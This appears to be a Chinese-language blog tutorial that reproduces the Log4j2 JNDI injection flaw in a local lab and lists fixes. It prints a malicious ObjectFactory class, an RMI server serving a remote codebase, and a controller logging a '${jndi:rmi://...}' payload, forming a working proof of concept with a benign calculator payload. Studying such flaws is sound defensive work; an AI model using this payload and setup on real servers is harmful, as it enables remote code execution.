---
title: log4j漏洞复现及其原理
index_img: 'https://file.hyqup.cn/img/gamersky_10origin_19_20169281140AB3.jpg'
banner_img: 'https://file.hyqup.cn/img/13.jpg'
abbrlink: 51961c7e
date: 2022-05-07 22:31:13
tags:
categories:
description:
---

将本地演示log4j漏洞的入侵原理及其修复方案

<!-- more -->

## 简介

Apache Log4j2是一款优秀的Java日志框架，Log4j2远程代码执行漏洞，JNDI注入漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。原理：利用日志记录时候注入jndi 远程链接，jndi通过rmi 协议访问远程http服务的代码，然后将目标服务器的代码加载到当前VM来执行

 JNDI（Java Naming and Directory Interface,Java命名和目录接口）。

基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI- https://xz.aliyun.com/t/7079

## 前置条件

1、jdk<1.8.0_191  这里是java1.8

JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK情况下可能会失败

原因：从 JAVA 1.8_191 起默认不信任远程 codebase，即远程 class 文件不会被自动加载，所以在 JAVA 1.8_191 及以后只能从本地 class 文件加载，但网上也有绕过，这里不细谈，详情百度

我的版本：

![image-20220507231250197](https://file.hyqup.cn/img/image-20220507231250197.png)

2、Apache Log4j 2.x <= 2.14.1

## 准备工作

- 攻击服务
  - 搭建一个rmi服务
  - 启动一个nginx,并且html目录下放置恶意脚本class文件

- 模拟业务服务 log4j-track-test 基于springboot 2.0.0.RELEASE,移除logging,并加入含log4j2是2.10.0版本的简单web应用

## 攻击搭建

### 恶意文件

恶意代码模拟，这里恶意模拟获取系统环境执行打开一个计算器应用：AttackService

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

/**
 * Copyright © 2022灼华. All rights reserved.
 *
 * @author create by hyq
 * @version 1.0
 * @date 2022/5/7
 * @description:
 */
public class AttackService implements ObjectFactory {
    {
        System.out.println("代码块：攻击服务器！");
        Runtime.getRuntime().exec("calc.exe");
    }

    static {
        System.out.println("静态代码块：攻击服务器！");
        try {
            Runtime.getRuntime().exec("notepad.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public AttackService() throws IOException {
        System.out.println("构造函数：攻击服务器！");
        Runtime.getRuntime().exec("calc.exe");
    }


    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("getObjectInstance：攻击服务器！");
        Runtime.getRuntime().exec("calc.exe");
        return null;
    }
}
```

### ngin搭建

将上述文件AttackService.java编译程AttackService.class 放于nginx htm目录下

![image-20220507232159834](https://file.hyqup.cn/img/image-20220507232159834.png)

启动nginx;

测试访问：[http://127.0.0.1:80/AttackService.class](https://links.jianshu.com/go?to=http%3A%2F%2F127.0.0.1%3A80%2FAttackService.class) 可以下载到文件，这一步就算成功

### 搭建rmi服务

```java
package com.kpy.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Copyright © 2022灼华. All rights reserved.
 *
 * @author create by hyq
 * @version 1.0
 * @date 2022/5/7
 * @description:
 */
public class RmiServerRun {

    public static void main(String[] args) {
        Registry registry = null;
        try {
            registry = LocateRegistry.createRegistry(1098);
            // 远程连接到nginx http://127.0.0.1:80/AttackService.class 执行该脚本
            Reference reference = new Reference("AttackService",
                    "AttackService", "http://192.168.101.11:80/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("attack", referenceWrapper);
            System.out.println("rmi服务端启动成功！");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

这里启用1098端口的rmi服务，启动后绑定该端口。

192.168.101.11 是我本地的局域网端口，这里可以尝试使用127.0.0.1也是可以的

## 被攻击服务

搭建一个maven 工程springboot服务，pomz中dependencies文件如下

```xml
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
        <exclusions>
            <!-- 排除掉logging，不使用logback，改用log4j2 -->
            <exclusion>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-logging</artifactId>
            </exclusion>
        </exclusions>
    </dependency>

    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-test</artifactId>
        <scope>test</scope>
    </dependency>

    <!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2 -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-log4j2</artifactId>
        <version>2.5.4</version>
    </dependency>

</dependencies>
```

准备一个简易的log4j.properties

```properties
log4j.rootLogger=WARN, stdout
log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.stdout.layout.ConversionPattern=%d %p [%c] - %m%n
```

controller如下

```java
package com.kpy.log4jtracktest.controller;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

/**
 * Copyright © 2022灼华. All rights reserved.
 *
 * @author create by hyq
 * @version 1.0
 * @date 2022/5/7
 * @description:
 */

@RestController
@RequestMapping("track")
public class TrackController {
    private static final Logger logger = LoggerFactory.getLogger(TrackController.class);

    @GetMapping("hello")
    public String hello() {
        System.out.println("进入服务");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        logger.info("${jndi:rmi://192.168.101.11:1098/attack}");

        return "123";
    }
}
```

  System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");  该值为false所以就会跑出异常中止执行

在当前环境vm 打印出我们放在nginx 里面的伪代码，并且打开了计算器就算浮现成功

![image-20220507233248474](https://file.hyqup.cn/img/image-20220507233248474.png)

## 解决办法

1、pom.xml中升级log4j的版本到2.15.0或者更高

```xml
<properties>
        <log4j2.version>2.15.0</log4j2.version>
</properties>
```

2、JDK 版本升级更高 JDK 11.0.1、8u191、7u201、6u211或者更高版本

3、采用logback记录日志，logback+slfj是一套非常优秀的解决方案
